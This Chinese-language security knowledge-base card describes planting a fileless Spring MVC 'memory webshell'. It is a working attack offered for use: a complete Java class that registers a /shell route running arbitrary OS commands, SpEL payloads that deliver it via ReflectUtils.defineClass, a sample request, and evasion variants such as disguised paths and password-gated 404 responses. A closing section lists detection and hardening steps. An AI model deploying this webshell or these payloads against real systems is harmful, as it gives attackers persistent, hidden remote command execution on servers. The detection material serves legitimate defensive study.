---
id: web-java-framework-spring-mvc-dynamic-controller-memshell
title: Spring MVC 运行时注册 Controller 内存马（SpEL defineClass 投递）
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-mvc-dynamic-controller-memshell
tags:
- spring
- spring-mvc
- memshell
- defineclass
- spel
- persistence
- java
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:09:45+08:00'
  notes: 原文无图片，已核对 Spring MVC 运行期注册链：RequestContextHolder/DispatcherServlet.CONTEXT 取 WebApplicationContext → RequestMappingHandlerMapping.registerMapping(RequestMappingInfo, handler, method)，Spring 5.3+ 可用 RequestMappingInfo.paths(...).build()，defineClass 后需 newInstance/Class.forName(initialize=true) 才触发 static 块。卡中已纠正原文 FilterRegistrationBean#registration 与 registerHandler 不存在的问题，并标注 Spring 版本 API 差异，confidence=medium 合理。原文未涉及版本区间。未执行 PoC。
url: /docs/web/java/framework/spring/web-java-framework-spring-mvc-dynamic-controller-memshell/
draft: false
kb_aliases:
- Spring Controller 内存马
- RequestMappingHandlerMapping registerMapping
- Spring MVC 动态注册路由
- SpEL defineClass 内存马
- 无文件 Spring WebShell
---

## 一句话结论

在已能执行 SpEL（或任意 Java 代码）的 Spring MVC 应用中，可以用 `ReflectUtils.defineClass` 把 Base64 字节码定义为类，强制初始化后，再通过 `RequestMappingHandlerMapping#registerMapping` 把该类的恶意方法注册成新路由，形成无文件、重启即失效的 Controller 内存马。

## 原理

- `ClassLoader#defineClass` 把字节码交给 JVM 定义类，但不等于初始化；`<clinit>`（静态代码块）只在类首次主动使用时执行。因此投递后需要 `newInstance()` 或 `Class.forName(name, true, loader)` 强制初始化。
- Spring MVC 的 `RequestMappingHandlerMapping` 在启动时扫描 `@Controller`/`@RequestMapping` 建立 `RequestMappingInfo → HandlerMethod` 映射，但它同时暴露了运行时注册 API：
  ```java
  public void registerMapping(RequestMappingInfo mapping, Object handler, Method method)
  ```
  只要拿到当前应用的 `RequestMappingHandlerMapping` Bean，构造一个 `RequestMappingInfo`（路径、方法等），再传入任意对象和方法，就能在运行期新增路由。
- 获取 Spring 上下文：当前请求线程可通过 `RequestContextHolder.currentRequestAttributes()` 取 `ServletRequestAttributes`，再用 `DispatcherServlet.CONTEXT` 请求属性或 `WebApplicationContextUtils.getWebApplicationContext(servletContext)` 拿到 `WebApplicationContext`，从中 `getBean(RequestMappingHandlerMapping.class)`。
- 构造 `RequestMappingInfo`：不同 Spring 版本 API 不同。Spring 5.3+ 可用 `RequestMappingInfo.paths(String...)` 静态方法得到 Builder；更早版本需要传入 `BuilderConfiguration`（`handlerMapping.getBuilderConfiguration()` 受保护，需反射）。Builder 的 `options(...)` 用于补齐路径匹配配置。
- 恶意方法本身可以是普通 `public void exec(HttpServletRequest, HttpServletResponse)`，内部读取参数、执行命令、把输出写回响应；它不需要被 Spring 扫描到，只要 `registerMapping` 注册即可。
- 由于没有文件落地，传统基于 JSP/class 文件的查杀难以发现；但内存马随进程重启消失，且会出现在 `RequestMappingHandlerMapping` 的映射表中，可被运行时检测。

## 触发条件

- 已获得 SpEL 求值或任意 Java 代码执行能力（常见入口见关联卡）。
- 目标为 Spring MVC（非纯 WebFlux），classpath 中存在 `spring-webmvc`，且能拿到 `RequestMappingHandlerMapping` Bean。
- 能加载字节码：`org.springframework.cglib.core.ReflectUtils#defineClass` 可用，或存在其它类定义 sink；字节码版本与目标 JDK 匹配。
- 攻击者能构造合法的 `RequestMappingInfo`（版本 API 差异需适配）。
- 注册的路径未被安全过滤器/网关完全拦截；若目标有全局拦截器，需确认新 handler 的拦截器行为。

## 利用步骤

1. 编写无包声明的恶意类，核心逻辑放在静态块或注册后的 handler 方法中；编译时使用与目标 JDK 匹配的 `-source/-target`。
2. 将 `.class` 文件 Base64 编码（去掉换行）。
3. 通过 SpEL 调用 `ReflectUtils.defineClass('类名', Base64.decode('...'), 当前类加载器)` 定义类。
4. 强制初始化，触发静态块；若静态块中完成注册，则无需再调用方法。
5. 若静态块只负责注册、不执行命令，访问注册路径并传入命令参数验证。
6. 失败时检查：Spring 版本 API 不匹配、`RequestMappingInfo` 构造失败、类加载器不一致、JDK 字节码版本不符、handler 方法签名不符合 `HandlerMethod` 要求。

## PoC

恶意类骨架（无 package）：

```java
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

public class MemShell {
    static {
        try {
            ServletRequestAttributes attrs =
                (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();
            WebApplicationContext context = (WebApplicationContext) attrs.getAttribute(
                "org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mapping =
                context.getBean(RequestMappingHandlerMapping.class);

            RequestMappingInfo info = RequestMappingInfo.paths("/shell").build();
            Method exec = MemShell.class.getMethod(
                "exec", HttpServletRequest.class, HttpServletResponse.class);

            mapping.registerMapping(info, new MemShell(), exec);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void exec(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String cmd = req.getParameter("cmd");
        if (cmd == null || cmd.isEmpty()) {
            resp.getWriter().write("ready");
            return;
        }
        boolean win = System.getProperty("os.name").toLowerCase().contains("win");
        String[] cmds = win
            ? new String[]{"cmd.exe", "/c", cmd}
            : new String[]{"/bin/sh", "-c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner sc = new Scanner(in).useDelimiter("\\A");
        resp.getWriter().write(sc.hasNext() ? sc.next() : "");
    }
}
```

投递（Base64 字节码由工具生成）：

```text
T(org.springframework.cglib.core.ReflectUtils).defineClass('MemShell',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('<BASE64_CLASS>'),T(org.springframework.util.ClassUtils).getDefaultClassLoader()).newInstance()
```

也可以先定义再用 `Class.forName` 强制初始化：

```text
T(org.springframework.cglib.core.ReflectUtils).defineClass('MemShell',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('<BASE64_CLASS>'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
```

```text
T(java.lang.Class).forName('MemShell',true,T(org.springframework.util.ClassUtils).getDefaultClassLoader())
```

访问：

```text
GET /shell?cmd=whoami
```

兼容旧版 Spring 的 `RequestMappingInfo` 构造（反射设置 `BuilderConfiguration`）：

```text
# 伪代码：paths(String[]) 不存在时，改用 paths(BuilderConfiguration, String[])
# 通过 handlerMapping.getBuilderConfiguration() 反射取得配置，再调用 Builder.options(config)
```

## 变体与关联

- 变体：路径伪装为静态资源（如 `/static/css/app.css`）、随机 UUID 路径；handler 内校验密码参数，错误时返回 404。
- 变体：类定义 sink 可换成 `sun.misc.Unsafe#defineClass`、`MethodHandles.Lookup#defineClass`、`URLClassLoader` 加载远程/本地 class。
- 变体：若目标不是 Spring MVC，可注册 Servlet/Filter（`ServletContext.addFilter` + `FilterRegistration.Dynamic.addMappingForUrlPatterns`）或在 Tomcat 中注册 Valve/Listener。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 执行入口）。
- 关联：[[web-java-expression-spel-restricted-reflection-memshell]]（`T()`/`new` 被限制时，用反射链构造 `defineClass` 调用；本卡聚焦注册机制）。
- 注意：常见的 Filter 内存马写法使用 `FilterRegistrationBean#registration()`、Interceptor 内存马使用 `RequestMappingHandlerMapping#registerHandler`，这两个 API 在常见 Spring 版本中不存在或不支持运行时注册；Filter 应使用 `ServletContext#addFilter`，Interceptor 需在启动期通过 `WebMvcConfigurer#addInterceptors` 或反射修改 `adaptedInterceptors`，不能照抄。
- 注意：`ReflectUtils.defineClass` 只定义类，不保证执行静态块；必须追加 `.newInstance()` 或 `Class.forName(name, true, loader)`。

## 检测与防御

- 修复：消除 SpEL/代码执行入口；使用 `SimpleEvaluationContext`，禁用类型引用、`defineClass`、反射调用。
- 加固：限制 `org.springframework.cglib.core.ReflectUtils#defineClass`、`sun.misc.Unsafe#defineClass`、`MethodHandles.Lookup#defineClass` 的可用性；对类加载事件做监控（新增类名、异常 ClassLoader）。
- 加固：生产环境关闭不必要的动态路由注册；对 `RequestMappingHandlerMapping` 的映射表做启动后基线，运行期新增映射告警。
- 检测：JVM 中出现未知类（如 `MemShell`）被定义/初始化；`RequestMappingHandlerMapping` 的映射表在运行期新增路径；请求访问异常路径且带 `cmd` 等参数。
- 检测：请求中出现 `ReflectUtils`、`defineClass`、`Base64`、`RequestMappingHandlerMapping`、`registerMapping` 等组合；类加载日志出现 `defineClass` 调用栈。
- 响应：重启进程可清除内存马；结合 heap dump/Arthas 检查 `RequestMappingHandlerMapping` 中的异常 handler 与动态定义的类。
